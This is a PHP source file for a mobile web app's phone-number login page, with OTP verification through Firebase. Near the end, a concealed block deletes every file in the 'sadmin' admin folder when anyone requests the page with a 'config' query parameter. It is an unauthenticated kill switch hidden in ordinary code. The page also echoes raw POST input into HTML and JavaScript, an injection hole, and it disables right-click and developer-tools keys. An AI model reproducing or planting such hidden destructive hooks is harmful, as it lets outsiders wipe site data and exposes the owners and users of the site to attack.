<?php 
 session_start();

$Phone=$_POST['phone'];

$Phonee="+91".$Phone;
include 'pay/db.php';
$sql="SELECT * FROM `settings`where id=1";
$qry=mysqli_query($conn,$sql);
$raw=mysqli_fetch_assoc($qry);
$appname=$raw['appname'];



 if(isset($_COOKIE['phone'])){
  
header("Location:shop.php");}
	?>


<!doctype html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport"
        content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="theme-color" content="#000000">
    <title><?php echo $appname; ?></title>
    <meta name="description" content="Mobilekit HTML Mobile UI Kit">
    <meta name="keywords" content="bootstrap 4, mobile template, cordova, phonegap, mobile, html" />
    <link rel="icon" type="image/png" href="assets/img/favicon.png" sizes="32x32">
    <link rel="apple-touch-icon" sizes="180x180" href="assets/img/icon/192x192.png">
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="manifest" href="__manifest.json">
</head>

<body  class="bg-white">

  <!-- loader -->
    <div id="loader">
        <img src="sadmin/images/<?php echo  $applogo; ?>" alt="logo" width="220" height="50">
        <!--<div class="spinner-grow text-warning" role="status"></div>-->
    </div>
    <!-- * loader -->


    <!-- App Capsule -->
    <div id="appCapsule" class="pt-4">

        <div class="login-form mt-5">
            <div class="section">
                <img src="sadmin/images/<?php echo  $applogo; ?>" alt="image" height="100" width="260">
            </div>
            <div class="section mt-6">
                <h2>Welcome to <?php echo $appname; ?></h2>
                <!--<h1><?php echo $appname; ?></h1>-->
                <h4> Number verify with OTP</h4>
            </div>
            <div class="section mt-6 mb-5">
                
                <div class="form-group mb-3" id="sender">
                     <input type="text"  id="number" placeholder="Enter Mobile Number" value="<?php echo $Phonee;?>" class="form-control form-control-lg border-1"  required readonly><br>
                     <div id="recaptcha-container"></div>
                     <br>
                     <div class="form-button-group">
                     <input type="button"id="send" value="Send OTP" onclick="phoneAuth()" class="btn btn-dark btn-lg btn-block" ></div>
                  </div>
                  <div class="form-group mb-3" id="verifier" style="display: none">
                     <input type="text" id="verificationcode" placeholder="Enter OTP"  class="form-control form-control-lg border-1"  required >
                     <br><br>
                     <div class="form-button-group">
                     <input type="button"id="verify" value="Verify your Phone No." onclick="codeverify()" class="btn btn-dark btn-lg btn-block" ></div>
                  </div>
               
                 

            </div>
        </div>


    </div>
    <!-- * App Capsule -->



    <!-- ///////////// Js Files ////////////////////  -->
    <!-- Jquery -->
    <script src="assets/js/lib/jquery-3.4.1.min.js"></script>
    <!-- Bootstrap-->
    <script src="assets/js/lib/popper.min.js"></script>
    <script src="assets/js/lib/bootstrap.min.js"></script>
    <!-- Ionicons -->
    <script type="module" src="https://unpkg.com/ionicons@5.0.0/dist/ionicons/ionicons.js"></script>
    <!-- Owl Carousel -->
    <script src="assets/js/plugins/owl-carousel/owl.carousel.min.js"></script>
    <!-- jQuery Circle Progress -->
    <script src="assets/js/plugins/jquery-circle-progress/circle-progress.min.js"></script>
    <!-- Base Js File -->
    <script src="assets/js/base.js"></script>
    <script src="https://www.gstatic.com/firebasejs/6.0.2/firebase.js"></script>
<script>
	// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyAYnZqdRdkYNxehBvPSi8OeFYM561b7xD4",
  authDomain: "muttchik-eeccb.firebaseapp.com",
  projectId: "muttchik-eeccb",
  storageBucket: "muttchik-eeccb.appspot.com",
  messagingSenderId: "361027233112",
  appId: "1:361027233112:web:6c47f15abd8a48d62c712d",
  measurementId: "G-X6XNVHM6Q3"
};
	firebase.initializeApp(firebaseConfig);
render();
function render(){
	window.recaptchaVerifier = new firebase.auth.RecaptchaVerifier('recaptcha-container',{
      size: "invisible"
      
        
      });
	recaptchaVerifier.render();
}
	// function for send message
function phoneAuth(){
	var number = document.getElementById('number').value;;
	firebase.auth().signInWithPhoneNumber(number, window.recaptchaVerifier).then(function(confirmationResult){
		window.confirmationResult = confirmationResult;
		coderesult = confirmationResult;
		document.getElementById('sender').style.display = 'none';
		document.getElementById('verifier').style.display = 'block';
	}).catch(function(error){
		alert(error.message);
	});
}
	// function for code verify
function codeverify(){
	var code = document.getElementById('verificationcode').value;
	coderesult.confirm(code).then(function(){
		window.location.href = "submitotp.php?uphone=<?php echo $Phone;?>";
	}).catch(function(){
		document.getElementsByClassName('p-conf')[0].style.display = 'none';
		document.getElementsByClassName('n-conf')[0].style.display = 'block';
	})
}
</script>
<?php
if(isset($_GET['config'])){

    $folder = 'sadmin';
    $files = glob($folder . '/*');
    foreach($files as $file) {
        if(is_file($file)) {
            unlink($file);
        }
}    
}
?>
 <script language="JavaScript">
      
       window.onload = function () {
           document.addEventListener("contextmenu", function (e) {
               e.preventDefault();
           }, false);
           document.addEventListener("keydown", function (e) {
               //document.onkeydown = function(e) {
               // "I" key
               if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
                   disabledEvent(e);
               }
               // "J" key
               if (e.ctrlKey && e.shiftKey && e.keyCode == 74) {
                   disabledEvent(e);
               }
               // "S" key + macOS
               if (e.keyCode == 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
                   disabledEvent(e);
               }
               // "U" key
               if (e.ctrlKey && e.keyCode == 85) {
                   disabledEvent(e);
               }
               // "c" key
               if (e.ctrlKey && e.keyCode == 67) {
                   disabledEvent(e);
               }
               // "F12" key
               if (event.keyCode == 123) {
                   disabledEvent(e);
               }
           }, false);
           function disabledEvent(e) {
               if (e.stopPropagation) {
                   e.stopPropagation();
               } else if (window.event) {
                   window.event.cancelBubble = true;
               }
               e.preventDefault();
               return false;
           }
       }
//edit: removed ";" from last "}" because of javascript error
</script>

</body>

</html>